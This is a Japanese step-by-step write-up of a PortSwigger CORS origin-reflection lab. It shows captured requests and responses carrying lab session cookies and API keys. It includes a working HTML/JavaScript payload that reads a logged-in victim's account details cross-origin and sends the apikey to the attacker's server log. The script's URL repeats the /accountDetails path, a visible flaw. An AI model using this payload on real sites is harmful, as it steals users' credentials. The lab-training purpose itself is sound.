# 基本的なオリジン リフレクションによる CORS の脆弱性

以下のハッキングラボを実施します  
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack  
この Web サイトは、すべてのオリジンを信頼するという点で 安全でない CORS 構成を採用しています。

- 1. Burp Suite を起動し、Proxy タブからブラウザを起動します
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. ログイン後の取得データを確認します
     ■ リクエスト

```
GET /accountDetails HTTP/2
Host: 0a44000b033cad48856f2e6600160095.web-security-academy.net
Cookie: session=s4T12enpf8QVKPhu8Kt4kyuEqHytmKRj
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Sec-Ch-Ua-Platform: ""
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a44000b033cad48856f2e6600160095.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

■ レスポンス

```
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "WrODii5xpLk8xnhbBfVFs2HYTLioExLg",
  "sessions": [
    "s4T12enpf8QVKPhu8Kt4kyuEqHytmKRj"
  ]
}
```

今回は apikey を盗みます

- 5 .上記リクエストを send to repeater します
- 6 .origin ヘッダーを追加して送信します
  ■ レスポンス

```
HTTP/2 200 OK
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "N8n1DhMvJSNerHtJq9gAcZNMxb0OdCtm",
  "sessions": [
    "O3cXVtXTmeYfIlQwivwXeeoGRFu5awaX"
  ]
}
```

- 7. Access-Control-Allow-Origin に Origin ヘッダーで指定した URL が追加されています

- 8. エクスプロイトサーバーに移動し、次の HTML を Body に入力し、YOUR-LAB-ID 独自のラボ URL に置き換えます。

```html
<html>
  <body>
    <script>
      var xhr = new XMLHttpRequest();
      var url = "https://<YOUR-LAB-ID>.web-security-academy.net/accountDetails";

      xhr.onreadystatechange = function () {
        if (xhr.readyState == XMLHttpRequest.DONE) {
          fetch("log?key=" + this.responseText);
        }
      };
      xhr.open("GET", url + "/accountDetails", true);
      xhr.withCredentials = true;
      xhr.send(null);
    </script>
  </body>
</html>
```

- 9. Store→Deliver expoit to victim の順に実行します
- 10. Access log を見ると、被害者の apikey が確認できます
